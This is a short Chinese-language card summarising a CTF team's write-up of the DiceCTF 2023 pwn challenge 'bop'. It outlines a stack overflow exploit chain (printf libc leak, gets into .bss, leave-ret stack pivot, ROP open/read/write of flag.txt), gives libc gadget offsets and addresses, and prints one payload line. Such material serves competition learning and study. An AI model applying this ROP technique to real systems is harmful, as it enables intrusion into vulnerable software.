---
title: "DiceCTF 2023 Writeup by r3kapig"
category: pwn
tags: ["DiceCTF 2023", "pwn", "pwn", "bop", "ret2libc", "orw"]
signals: ["DiceCTF 2023 2023", "pwn", "bop", "ret2libc", "orw", "open-read-write", "leave-ret", "printf-leak", "gets", "rop", "DiceCTF", "ORW", "open", "read"]
difficulty: hard
source: "https://www.ctfiot.com/96097.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# DiceCTF 2023 Writeup by r3kapig

> 赛事：DiceCTF 2023 2023 | 方向：pwn | 难度：hard

## 一句话总结

DiceCTF 2023 bop：ret2libc+ORW（open+read+write）flag.txt

## 攻击链

1. bop: 32字节溢出+ret2libc+ORW
2. 阶段1: printf泄露libc+gets写入bss
3. 阶段2: open(flag.txt, 0) + read(3, 0x404300, 0x100) + write(1, 0x404300, 0x100)
4. libc gadgets: pop_rdi 0x2a1f5 pop_rsi 0x2601f pop_rdx 0x142c92
5. syscall 0x25EE2
6. read 0x10dfc0
7. puts.got 0x404090

## 关键 payload

```
pay = b'a'*32 + p64(0x404120-0x8) + pop_rdi + 0x404090 + printf + pop_rdi + 0x404100 + gets + leave_ret
```

## 经验教训

32字节溢出+leave_ret栈迁移实现 ORW 三件套

## 标签

pwn、bop、ret2libc、orw、open-read-write、leave-ret、printf-leak、gets

## 参考来源

- https://www.ctfiot.com/96097.html
- 原文件：DiceCTF_2023_Writeup_by_r3kapig.full.md
